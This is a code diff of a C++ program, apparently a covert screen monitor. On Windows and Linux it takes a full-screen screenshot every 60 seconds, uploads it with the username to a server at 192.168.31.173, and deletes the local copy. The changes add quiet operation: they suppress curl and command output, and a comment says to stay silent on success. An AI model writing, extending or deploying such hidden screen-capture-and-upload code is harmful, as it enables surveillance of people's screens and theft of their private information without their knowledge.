@@ -3,20 +3,26 @@
 #include <thread>
 #include <chrono>
 #include <cstdlib>
-#include <iomanip>  
-#include <sstream>  
+#include <iomanip>
+#include <sstream>
+#include <vector>
 #include <curl/curl.h>
+#include <cstdio> // для remove и fopen
 
 #ifdef _WIN32
     #include <windows.h>
     #include <lmcons.h>
+    #include <gdiplus.h>
+    using namespace Gdiplus;
 #else
     #include <unistd.h>
     #include <pwd.h>
+    #include <sys/types.h>
 #endif
 
 using namespace std;
 
+// --- Вспомогательные функции (без изменений) ---
 string get_username() {
 #ifdef _WIN32
     char username[UNLEN + 1];
@@ -25,7 +31,7 @@ string get_username() {
     return "unknown_win";
 #else
     struct passwd *pw = getpwuid(getuid());
-    return pw ? pw->pw_gecos : "unknown_linux"; // pw_name ??
+    return pw ? pw->pw_name : "unknown_linux"; 
 #endif
 }
 
@@ -37,22 +43,76 @@ string get_timestamp() {
     return ss.str();
 }
 
+// --- Windows GDI+ ---
+#ifdef _WIN32
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT  num = 0; UINT  size = 0;
+    GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL) return -1;
+    GetImageEncoders(num, size, pImageCodecInfo);
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+    free(pImageCodecInfo);
+    return -1;
+}
+
+bool take_windows_screenshot(const string& filename_utf8) {
+    int len = MultiByteToWideChar(CP_UTF8, 0, filename_utf8.c_str(), -1, NULL, 0);
+    if (len == 0) return false;
+    vector<wchar_t> wfilename(len);
+    MultiByteToWideChar(CP_UTF8, 0, filename_utf8.c_str(), -1, &wfilename[0], len);
+
+    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    int left = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int top = GetSystemMetrics(SM_YVIRTUALSCREEN);
+
+    HDC hdcScreen = GetDC(NULL);
+    HDC hdcMem = CreateCompatibleDC(hdcScreen);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
+    HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);
+    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, left, top, SRCCOPY);
+
+    Bitmap bitmap(hBitmap, NULL);
+    CLSID clsid;
+    bool success = false;
+    if (GetEncoderClsid(L"image/png", &clsid) > -1) {
+        if (bitmap.Save(&wfilename[0], &clsid, NULL) == Ok) success = true;
+    }
+
+    SelectObject(hdcMem, hOld);
+    DeleteObject(hBitmap);
+    DeleteDC(hdcMem);
+    ReleaseDC(NULL, hdcScreen);
+    return success;
+}
+#endif
+
+// --- Linux Команды ---
+#ifndef _WIN32
 string get_linux_screenshot_command(const string& filename) {
     const char* session_env = getenv("XDG_SESSION_TYPE");
     string session = (session_env) ? session_env : "x11"; 
-
     const char* desktop_env = getenv("XDG_CURRENT_DESKTOP");
     string desktop = (desktop_env) ? desktop_env : "";
 
     if (session == "wayland") {
         if (desktop.find("KDE") != string::npos) return "spectacle -b -n -o " + filename;
         if (desktop.find("GNOME") != string::npos) return "gnome-screenshot -f " + filename;
-        return "grim " + filename;
+        return "grim " + filename; 
     } 
-    return "DISPLAY=:0 scrot -z " + filename;
+    return "scrot -z " + filename;
 }
+#endif
 
-// Функция отправки файла на сервер
+// --- Отправка ---
 void send_file(string filename, string user) {
     CURL *curl = curl_easy_init();
     if(curl) {
@@ -69,9 +129,14 @@ void send_file(string filename, string user) {
         curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.31.173:5000/upload");
         curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
 
+        // Отключаем вывод прогресса curl в консоль
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, NULL); 
+        
         CURLcode res = curl_easy_perform(curl);
+        
+        // Логируем ТОЛЬКО ошибки
         if(res != CURLE_OK) {
-            fprintf(stderr, "Ошибка отправки: %s\n", curl_easy_strerror(res));
+            cerr << "[ERROR] Send failed: " << curl_easy_strerror(res) << endl;
         }
             
         curl_easy_cleanup(curl);
@@ -83,26 +148,53 @@ void run_monitor() {
     curl_global_init(CURL_GLOBAL_ALL);
     string user = get_username();
     
+    #ifdef _WIN32
+    GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+    #endif
+
     while (true) {
         string filename;
-        string cmd;
+        bool screenshot_taken = false;
 
-#ifdef _WIN32
-        // Для Windows используем папку Temp пользователя
-        filename = "C:\\Windows\\Temp\\scr_" + get_timestamp() + ".png";
-        cmd = ""; // GDI
-#else
+        #ifdef _WIN32
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        filename = string(tempPath) + "scr_" + get_timestamp() + ".png";
+        screenshot_taken = take_windows_screenshot(filename);
+        #else
         filename = "/tmp/scr_" + get_timestamp() + ".png";
-        cmd = get_linux_screenshot_command(filename);
-#endif
+        string cmd = get_linux_screenshot_command(filename);
+        // Заглушаем вывод системных команд (> /dev/null 2>&1)
+        if (!cmd.empty() && system((cmd + " > /dev/null 2>&1").c_str()) == 0) {
+            screenshot_taken = true;
+        }
+        #endif
 
-        if (!cmd.empty() && system(cmd.c_str()) == 0) {
-            send_file(filename, user);
-            remove(filename.c_str()); 
+        if (screenshot_taken) {
+            FILE *f = fopen(filename.c_str(), "rb");
+            if (f) {
+                fclose(f);
+                send_file(filename, user);
+                remove(filename.c_str());
+                // УСПЕХ - молчим
+            } else {
+                cerr << "[ERROR] File created but not readable: " << filename << endl;
+            }
+        } else {
+            // Не удалось сделать скриншот (может экран заблокирован),
+            // можно закомментировать, если это спамит при заблокированном ПК
+            cerr << "[WARN] Failed to take screenshot (Screen locked?)" << endl;
         }
         
         this_thread::sleep_for(chrono::seconds(60));
     }
+
+    #ifdef _WIN32
+    GdiplusShutdown(gdiplusToken);
+    #endif
+
     curl_global_cleanup();
 }
 
